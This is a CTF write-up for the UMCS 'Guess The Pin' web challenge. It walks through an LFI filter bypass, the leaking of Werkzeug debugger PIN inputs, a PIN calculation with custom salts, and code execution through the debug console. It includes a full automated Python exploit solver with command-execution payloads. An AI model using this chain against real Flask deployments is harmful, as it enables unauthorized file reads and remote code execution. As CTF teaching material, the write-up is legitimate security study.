---
slug: "local-ctf/umcs-preliminary/web-guess-the-pin"
event: "umcs-preliminary"
title: "Guess The Pin"
summary: "UMCS Preliminary umcs preliminary, web, forensics writeup covering Guess The Pin with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - web
  - forensics
  - cryptography
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** Guess The Pin
**Category:** Web
**Points:** 250
**Flag Format:** `UMCS{...}`
**Final Flag:** `UMCS{DONT_DEB3G_IN_PR00D}`

The challenge provided a Flask web application for viewing university result reports. Users could register, log in, and view a report through the `/report` endpoint.

The main goal was to abuse a file-read vulnerability, recover the Werkzeug debugger PIN, unlock the debug console, gain Python code execution, and run the privileged `/readflag` helper to obtain the real flag.

A fake flag was present in the environment variable `FLAG`, but the challenge announcement explicitly stated that this environment flag should be ignored.

---

# Initial Analysis

After registering and logging in, the application exposed a `/report` endpoint. Leaking `/app/app.py` revealed the relevant route:

```python
@app.route("/report")
@login_required
def report():
    content = ""
    with open("/app/reports/" + request.args.get('student').replace('../','')) as f:
        content = f.read()
    return content
```

The endpoint attempted to prevent path traversal by removing the literal string `../`.

The application was running with Flask debug mode enabled:

```python
app.run(debug=True, port=5000, host="127.0.0.1")
```

Triggering `/report` without the `student` parameter caused an exception, which exposed the Werkzeug debugger page. The debugger was PIN-protected, so the next objective was to calculate the correct PIN.

The leaked Werkzeug source showed that the challenge modified the default Werkzeug PIN salts. Instead of using the normal `cookiesalt` and `pinsalt`, it used custom challenge-specific salts.

---

# Vulnerability / Weakness Identification

The main weakness was an **authenticated Local File Inclusion / path traversal** vulnerability in `/report`.

The filter was:

```python
request.args.get('student').replace('../','')
```

This is insecure because it only removes the exact substring `../`.

A bypass payload is:

```text
....//
```

When processed by `.replace('../', '')`, it becomes:

```text
../
```

Therefore, this request:

```text
/report?student=....//....//....//....//proc/self/environ
```

allows reading:

```text
/proc/self/environ
```

This allowed us to leak sensitive local files, including:

```text
/proc/self/environ
/proc/net/dev
/sys/class/net/eth0/address
/proc/sys/kernel/random/boot_id
/proc/self/cgroup
/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py
```

The second weakness was that **Werkzeug Debugger was enabled in production**. Once the correct PIN was calculated, the debugger allowed Python code execution in the Flask process.

---

# Exploitation Strategy

The full exploitation plan was:

1. Register and log in to obtain an authenticated session.

2. Abuse `/report?student=` path traversal to leak application and system files.

3. Leak the Werkzeug debugger source code.

4. Identify the modified PIN generation salts.

5. Leak the values used to generate the debugger PIN:

    - username

    - Flask module name

    - Flask app name

    - Flask module path

    - MAC address from `uuid.getnode()`

    - machine ID from `get_machine_id()`

6. Generate the correct Werkzeug PIN.

7. Submit the PIN to the debugger authentication endpoint.

8. Execute Python code through the debugger console.

9. Run `/readflag`, the root SUID helper, to retrieve the real flag.


The important discovery was that the challenge changed Werkzeug’s PIN salts:

```python
h.update(b"UMCSisGR8!@2026")
h.update(b"UMCSisGR887!@2026")
```

Using the default Werkzeug salts caused incorrect PINs. Once these custom salts were used, the correct PIN was generated.

---

# Proof of Concept

## LFI test

After logging in, the LFI can be triggered like this:

```text
/report?student=....//....//....//....//app/app.py
```

This leaks the Flask source code.

To leak environment variables:

```text
/report?student=....//....//....//....//proc/self/environ
```

The leaked values included:

```text
USER=www-data
LOGNAME=www-data
PYTHON_VERSION=3.10.19
HOSTNAME=1b7fc7c8b67c
FLAG=UMCS{fake-env-flag}
```

The environment flag was fake and not the intended solution.

## PIN generation inputs

For the solved instance, the relevant values were:

```text
username = www-data
modname = flask.app
app name = Flask
Flask path = /usr/local/lib/python3.10/site-packages/flask/app.py
eth0 MAC = 02:42:0a:00:01:9e
MAC decimal = 2482658869662
machine ID = ac967f89-317b-42bd-83ed-a7d1845bb89b
```

The MAC conversion was:

```python
int("02420a00019e", 16)
```

Result:

```text
2482658869662
```

The machine ID came from:

```text
/proc/sys/kernel/random/boot_id
```

because `/etc/machine-id` was empty. `/proc/self/cgroup` was `0::/`, so the cgroup tail was empty.

Using the custom salts, the PIN became:

```text
109-814-947
```

After submitting the PIN, the server returned:

```json
{"auth": true, "exhausted": false}
```

Then code execution was confirmed with:

```python
2+2
```

Output:

```text
4
```

Finally, listing `/` revealed a root SUID helper:

```text
/readflag
```

Executing it returned the real flag.

---

# Full Python Solver

```python
#!/usr/bin/env python3
import hashlib
import itertools
import random
import re
import string
from html import unescape
from urllib.parse import urljoin, urlparse

import requests

# ============================================================
# Guess The Pin final solver
#
# Chain:
#   1. Register and login
#   2. Abuse authenticated LFI in /report
#   3. Leak Werkzeug source and PIN inputs
#   4. Generate PIN using custom salts
#   5. Unlock Werkzeug debugger
#   6. Execute /readflag
# ============================================================

BASE_URL = "http://c9238730-a13e-4ab8-9194-dd15e25f23dc.chal.umcybersec.site:8001/login"
TIMEOUT = 10
MAX_PIN_ATTEMPTS = 5

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 CTF"})

parsed = urlparse(BASE_URL)
BASE = f"{parsed.scheme}://{parsed.netloc}"


def full(path):
    return urljoin(BASE + "/", path.lstrip("/"))


def randstr(length=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def extract_csrf(html):
    patterns = [
        r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*name=["\']csrf_token["\']',
    ]

    for pattern in patterns:
        match = re.search(pattern, html, re.I | re.S)
        if match:
            return unescape(match.group(1))

    return ""


def strip_html(text):
    text = re.sub(r"<br\s*/?>", "\n", text, flags=re.I)
    text = re.sub(r"<[^>]+>", "", text)
    return unescape(text)


def check_live():
    r = session.get(full("/login"), timeout=TIMEOUT)
    print(f"[*] GET /login => {r.status_code}")

    if r.status_code != 200 or "frp" in r.text.lower():
        print("[-] Instance is dead or wrong URL")
        print(r.text[:500])
        raise SystemExit


def register_and_login():
    username = "g10d_" + randstr()
    password = "Passw0rd_" + randstr()

    print(f"[+] Registering {username}:{password}")

    r = session.get(full("/register"), timeout=TIMEOUT)
    token = extract_csrf(r.text)

    session.post(
        full("/register"),
        data={
            "csrf_token": token,
            "username": username,
            "password": password,
            "submit": "Register",
        },
        allow_redirects=True,
        timeout=TIMEOUT,
    )

    r = session.get(full("/login"), timeout=TIMEOUT)
    token = extract_csrf(r.text)

    session.post(
        full("/login"),
        data={
            "csrf_token": token,
            "username": username,
            "password": password,
            "submit": "Login",
        },
        allow_redirects=True,
        timeout=TIMEOUT,
    )

    r = session.get(full("/dashboard"), timeout=TIMEOUT)

    if r.status_code == 200 and "login" not in r.url.lower():
        print("[+] Logged in")
        return username

    print("[-] Login failed")
    print(r.text[:500])
    raise SystemExit


def lfi(path):
    # The app removes literal "../".
    # "....//" becomes "../" after replace("../", "").
    payload = "....//....//....//....//" + path.lstrip("/")

    r = session.get(
        full("/report"),
        params={"student": payload},
        timeout=TIMEOUT,
    )

    return r.text


def clean_lfi(text):
    text = text.replace("\x00", "\n").strip()

    bad_markers = [
        "werkzeug debugger",
        "filenotfounderror",
        "attributeerror",
        "<!doctype html>",
        "no such file",
    ]

    if any(marker in text.lower() for marker in bad_markers):
        return ""

    return text


def parse_env(raw):
    raw = raw.replace("\x00", "\n")
    env = {}

    for line in raw.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            env[key] = value

    return env


def get_interfaces():
    raw = lfi("/proc/net/dev")
    interfaces = []

    for line in raw.splitlines():
        if ":" not in line:
            continue

        iface = line.split(":", 1)[0].strip()

        if iface and iface != "lo":
            interfaces.append(iface)

    return interfaces or ["eth0"]


def get_mac_decimal(iface):
    raw = clean_lfi(lfi(f"/sys/class/net/{iface}/address")).strip()

    if re.match(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$", raw):
        decimal = str(int(raw.replace(":", ""), 16))
        return raw, decimal

    return raw, None


def get_machine_ids():
    etc_machine = clean_lfi(lfi("/etc/machine-id")).strip()
    boot_id = clean_lfi(lfi("/proc/sys/kernel/random/boot_id")).strip()
    cgroup = clean_lfi(lfi("/proc/self/cgroup")).strip()

    cgroup_tail = ""

    if cgroup:
        cgroup_tail = cgroup.splitlines()[0].rpartition("/")[2].strip()

    print(f"[+] /etc/machine-id = {etc_machine!r}")
    print(f"[+] boot_id         = {boot_id!r}")
    print(f"[+] cgroup          = {cgroup!r}")
    print(f"[+] cgroup_tail     = {cgroup_tail!r}")

    candidates = []

    # Werkzeug logic:
    # use /etc/machine-id if available, otherwise boot_id,
    # then append cgroup tail.
    if etc_machine:
        candidates.append(("etc_machine", etc_machine))
        if cgroup_tail:
            candidates.append(("etc_machine+cgroup_tail", etc_machine + cgroup_tail))

    if boot_id:
        candidates.append(("boot", boot_id))
        if cgroup_tail:
            candidates.append(("boot+cgroup_tail", boot_id + cgroup_tail))

    seen = set()
    output = []

    for name, value in candidates:
        if value and value not in seen:
            seen.add(value)
            output.append((name, value))

    return output


def trigger_debugger():
    # Missing "student" intentionally crashes /report.
    r = session.get(full("/report"), timeout=TIMEOUT)
    print(f"[*] Trigger /report => {r.status_code}")
    return r.text


def extract_secret(html):
    match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', html)
    return match.group(1) if match else None


def extract_frames(html):
    frames = re.findall(r'id=["\']frame-([0-9]+)["\']', html)

    ordered = []
    for frame in frames:
        if frame not in ordered:
            ordered.append(frame)

    return ordered


def extract_custom_salts():
    source = lfi("/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py")

    start = source.find("def get_pin_and_cookie_name")
    end = source.find("class DebuggedApplication", start)

    if start == -1:
        print("[-] Could not find get_pin_and_cookie_name in Werkzeug source")
        raise SystemExit

    section = source[start:end]

    salts = re.findall(r'h\.update\(b["\']([^"\']+)["\']\)', section)

    if len(salts) < 2:
        print("[-] Could not extract custom salts")
        print(section[:2000])
        raise SystemExit

    cookie_salt = salts[0].encode()
    pin_salt = salts[1].encode()

    print(f"[+] Cookie salt = {cookie_salt!r}")
    print(f"[+] PIN salt    = {pin_salt!r}")

    return cookie_salt, pin_salt


def extract_flask_paths(env, debug_html):
    paths = []

    # Exact traceback path, if present.
    for pattern in [
        r'File <cite class="filename">"([^"]*flask/app\.py)"</cite>',
        r'File "([^"]*flask/app\.py)"',
    ]:
        for path in re.findall(pattern, debug_html, re.I):
            path = unescape(path).strip()
            if path not in paths:
                paths.append(path)

    pyver = env.get("PYTHON_VERSION", "3.10.19")
    major_minor = ".".join(pyver.split(".")[:2])

    candidates = [
        f"/usr/local/lib/python{major_minor}/site-packages/flask/app.py",
        f"/usr/local/lib/python{major_minor}/dist-packages/flask/app.py",
        "/usr/local/lib/python3.10/site-packages/flask/app.py",
        "/usr/local/lib/python3.9/site-packages/flask/app.py",
        "/usr/lib/python3.10/site-packages/flask/app.py",
        "/usr/lib/python3.10/dist-packages/flask/app.py",
        "/app/app.py",
    ]

    for path in candidates:
        if path not in paths:
            paths.append(path)

    return paths


def werkzeug_pin(public_bits, private_bits, cookie_salt, pin_salt):
    h = hashlib.sha1()

    for bit in itertools.chain(public_bits, private_bits):
        if not bit:
            continue

        if isinstance(bit, str):
            bit = bit.encode()

        h.update(bit)

    h.update(cookie_salt)
    cookie_name = "__wzd" + h.hexdigest()[:20]

    h.update(pin_salt)
    number = f"{int(h.hexdigest(), 16):09d}"[:9]

    pin = None

    for group_size in [5, 4, 3]:
        if len(number) % group_size == 0:
            pin = "-".join(
                number[i:i + group_size].rjust(group_size, "0")
                for i in range(0, len(number), group_size)
            )
            break

    if pin is None:
        pin = number

    return pin, cookie_name


def build_pin_candidates(env, debug_html, cookie_salt, pin_salt):
    users = [
        env.get("USER"),
        env.get("LOGNAME"),
        "www-data",
        None,
        "root",
        "app",
        "ctf",
    ]

    users = list(dict.fromkeys(users))

    paths = extract_flask_paths(env, debug_html)

    print("[+] Candidate Flask paths:")
    for path in paths:
        print(f"    {path}")

    macs = []

    for iface in get_interfaces():
        raw, decimal = get_mac_decimal(iface)
        print(f"[+] MAC {iface}: {raw} -> {decimal}")

        if decimal:
            macs.append((iface, decimal))

    machine_ids = get_machine_ids()

    candidates = []

    for user, path, (iface, mac), (machine_type, machine_id) in itertools.product(
        users,
        paths,
        macs,
        machine_ids,
    ):
        pin, cookie = werkzeug_pin(
            public_bits=[
                user,
                "flask.app",
                "Flask",
                path,
            ],
            private_bits=[
                mac,
                machine_id,
            ],
            cookie_salt=cookie_salt,
            pin_salt=pin_salt,
        )

        score = 0

        if user == "www-data":
            score += 100
        if iface == "eth0":
            score += 50
        if "python3.10" in path:
            score += 40
        if path.endswith("/flask/app.py"):
            score += 30
        if machine_type in ["boot", "etc_machine"]:
            score += 50

        candidates.append(
            {
                "pin": pin,
                "cookie": cookie,
                "score": score,
                "user": user,
                "path": path,
                "iface": iface,
                "mac": mac,
                "machine_type": machine_type,
                "machine_id": machine_id,
            }
        )

    best = {}

    for candidate in candidates:
        pin = candidate["pin"]

        if pin not in best or candidate["score"] > best[pin]["score"]:
            best[pin] = candidate

    return sorted(best.values(), key=lambda x: x["score"], reverse=True)


def authenticate_debugger(secret, pin):
    r = session.get(
        full("/report"),
        params={
            "__debugger__": "yes",
            "cmd": "pinauth",
            "pin": pin,
            "s": secret,
        },
        timeout=TIMEOUT,
    )

    print(f"[*] Trying PIN {pin} => {r.text.strip()}")

    try:
        data = r.json()
    except Exception:
        return False, False

    return bool(data.get("auth")), bool(data.get("exhausted"))


def console_eval(secret, frame, code):
    r = session.get(
        full("/report"),
        params={
            "__debugger__": "yes",
            "cmd": code,
            "frm": frame,
            "s": secret,
        },
        timeout=TIMEOUT,
    )

    return r.status_code, strip_html(r.text)


def is_valid_exec(cmd, status, output):
    if status == 404:
        return False
    if "404 Not Found" in output:
        return False
    if "Console Locked" in output[:1200] or "PIN:" in output[:1200]:
        return False
    if "Traceback" in output[:1200] or "AttributeError" in output[:1200]:
        return False

    if cmd == "2+2":
        return re.search(r"(^|\s)4(\s|$)", output) is not None

    return "uid=" in output or "/app" in output


def find_working_frame(secret, frames):
    tests = [
        "2+2",
        "__import__('os').popen('id;pwd;ls -la /').read()",
    ]

    for frame in frames:
        print(f"[*] Testing frame {frame}")

        for cmd in tests:
            status, output = console_eval(secret, frame, cmd)
            preview = output[:180].replace("\n", "\\n")
            print(f"    status={status} cmd={cmd[:35]!r} => {preview!r}")

            if is_valid_exec(cmd, status, output):
                print(f"[+] Working frame: {frame}")
                return frame

    return None


def run_readflag(secret, frame):
    payloads = [
        "__import__('subprocess').check_output(['/readflag'], text=True, stderr=__import__('subprocess').STDOUT)",
        "__import__('subprocess').run(['/readflag'], text=True, stdout=__import__('subprocess').PIPE, stderr=__import__('subprocess').STDOUT).stdout",
        "__import__('os').popen('/readflag').read()",
    ]

    for payload in payloads:
        print("\n" + "=" * 80)
        print("[*] Executing /readflag")
        print("=" * 80)

        status, output = console_eval(secret, frame, payload)
        print(output[:5000])

        flags = re.findall(r"UMCS\{[^}]+\}", output)

        # Ignore known fake environment flags.
        fake_flags = {
            "UMCS{70b35af8-14f2-476d-b7ad-cdda166de7a5}",
            "UMCS{4dc90d25-389a-460c-b389-bb6605e28fd8}",
        }

        real_flags = [flag for flag in flags if flag not in fake_flags]

        if real_flags:
            print(f"\n[+] FINAL FLAG: {real_flags[0]}")
            return real_flags[0]

    print("[-] No real flag found from /readflag")
    return None


def main():
    print(f"[*] Base: {BASE}")

    check_live()
    register_and_login()

    env = parse_env(lfi("/proc/self/environ"))

    debug_html = trigger_debugger()

    secret = extract_secret(debug_html)
    frames = extract_frames(debug_html)

    print(f"[+] SECRET={secret}")
    print(f"[+] Frames={frames}")
    print(f"[+] USER={env.get('USER')}")
    print(f"[+] PYTHON_VERSION={env.get('PYTHON_VERSION')}")

    if not secret or not frames:
        print("[-] Could not extract debugger secret or frame IDs")
        raise SystemExit

    cookie_salt, pin_salt = extract_custom_salts()

    candidates = build_pin_candidates(env, debug_html, cookie_salt, pin_salt)

    print("\n[*] Top PIN candidates:")
    for i, candidate in enumerate(candidates[:10], 1):
        print(
            f"{i:02d}. {candidate['pin']} "
            f"score={candidate['score']} "
            f"user={candidate['user']} "
            f"iface={candidate['iface']} "
            f"machine={candidate['machine_type']} "
            f"path={candidate['path']}"
        )

    winning_pin = None

    for candidate in candidates[:MAX_PIN_ATTEMPTS]:
        pin = candidate["pin"]

        authenticated, exhausted = authenticate_debugger(secret, pin)

        if exhausted:
            print("[-] PIN attempts exhausted. Restart the instance.")
            raise SystemExit

        if authenticated:
            winning_pin = pin
            print(f"[+] PIN accepted: {pin}")
            print("[+] Cookies:")
            print(session.cookies.get_dict())
            break

    if not winning_pin:
        print("[-] No PIN worked within safe attempt limit")
        raise SystemExit

    frame = find_working_frame(secret, frames)

    if not frame:
        print("[-] Could not find working debugger frame")
        raise SystemExit

    run_readflag(secret, frame)


if __name__ == "__main__":
    main()
```

---

# Walkthrough

Install dependencies:

```bash
python3 -m pip install requests
```

Run the solver:

```bash
python3 solve_guess_the_pin.py
```

If the instance URL changes, update this line in the script:

```python
BASE_URL = "http://TARGET-UUID.chal.umcybersec.site:8001/login"
```

Expected successful flow:

```text
[*] GET /login => 200
[+] Logged in
[*] Trigger /report => 500
[+] SECRET=...
[+] Cookie salt = b'UMCSisGR8!@2026'
[+] PIN salt    = b'UMCSisGR887!@2026'
[*] Trying PIN ...
[+] PIN accepted
[*] Testing frame ...
[+] Working frame
[*] Executing /readflag
[+] FINAL FLAG: UMCS{...}
```

Troubleshooting:

If you see:

```text
404 Not Found
server is powered by frp
```

the instance is dead or expired. Restart the challenge and use the new URL.

If you see:

```json
{"auth": false, "exhausted": true}
```

the debugger PIN attempts are exhausted. Restart the instance.

If the script calculates wrong PINs, leak Werkzeug source again and confirm the salts inside:

```text
/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py
```

---

# Flag

The final flag was recovered by executing:

```python
__import__('subprocess').check_output(['/readflag'], text=True)
```

Output:

```text
UMCS{DONT_DEB3G_IN_PR00D}
```

Final flag:

```text
UMCS{DONT_DEB3G_IN_PR00D}
```

---

# Conclusion

The root cause of this challenge was a combination of two issues:

1. An unsafe path traversal filter in `/report`.

2. Flask/Werkzeug debugger enabled in a production-like environment.


The file traversal allowed leaking the exact values required for Werkzeug PIN generation. The challenge modified Werkzeug’s default salts, so normal Werkzeug PIN calculators failed. By leaking the actual Werkzeug source code, we recovered the custom salts and generated the correct debugger PIN.

After unlocking the debugger, Python code execution was achieved. The real flag was not stored in a readable file under `/app`; instead, it was retrieved through the root SUID helper `/readflag`.

Key lesson:

```text
Never expose Werkzeug debugger in production, and never rely on simple string replacement to prevent path traversal.
```
